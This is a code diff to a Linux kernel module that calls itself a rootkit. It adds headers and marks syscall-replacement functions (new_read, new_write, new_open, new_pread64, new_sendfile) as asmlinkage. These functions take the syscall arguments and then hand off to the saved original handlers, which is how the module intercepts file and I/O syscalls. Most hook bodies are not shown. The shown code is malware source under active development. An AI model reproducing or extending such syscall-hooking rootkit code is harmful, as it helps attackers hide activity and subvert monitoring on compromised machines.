@@ -1,6 +1,8 @@
 #include <linux/fs.h>
+#include <linux/init.h>
 #include <linux/ioctl.h>
 #include <linux/kprobes.h>
+#include <linux/linkage.h>
 #include <linux/miscdevice.h>
 #include <linux/module.h>
 #include <linux/slab.h>
@@ -89,7 +91,7 @@ static __exit void rootkit_exit(void)
 	return;
 }
 
-long new_read(struct pt_regs *p_regs)
+asmlinkage long new_read(struct pt_regs *p_regs)
 {
 	unsigned int ui32_fd = (unsigned int)p_regs->di; // first parameter
 	char __user *s_buf = (char __user *)p_regs->si; // second parameter
@@ -115,7 +117,7 @@ long new_read(struct pt_regs *p_regs)
 	return l_ret;
 }
 
-long new_write(struct pt_regs *p_regs)
+asmlinkage long new_write(struct pt_regs *p_regs)
 {
 	unsigned int ui32_fd = (unsigned int)p_regs->di;
 	const char __user *s_buf = (const char __user *)p_regs->si;
@@ -138,7 +140,7 @@ long new_write(struct pt_regs *p_regs)
 	return orig_write(p_regs);
 }
 
-long new_open(struct pt_regs *p_regs)
+asmlinkage long new_open(struct pt_regs *p_regs)
 {
 	const char __user *s_filename = (const char *)p_regs->di;
 	int i32_flags = (int)p_regs->si;
@@ -149,7 +151,7 @@ long new_open(struct pt_regs *p_regs)
 	return orig_open(p_regs);
 }
 
-long new_pread64(struct pt_regs *p_regs)
+asmlinkage long new_pread64(struct pt_regs *p_regs)
 {
 	unsigned int ui32_fd = (unsigned int)p_regs->di;
 	char __user *s_buf = (char __user *)p_regs->si;
@@ -176,7 +178,7 @@ long new_pread64(struct pt_regs *p_regs)
 	return l_ret;
 }
 
-long new_sendfile(struct pt_regs *p_regs)
+asmlinkage long new_sendfile(struct pt_regs *p_regs)
 {
 	int i32_out_fd = (int)p_regs->di;
 	int i32_in_fd = (int)p_regs->si;
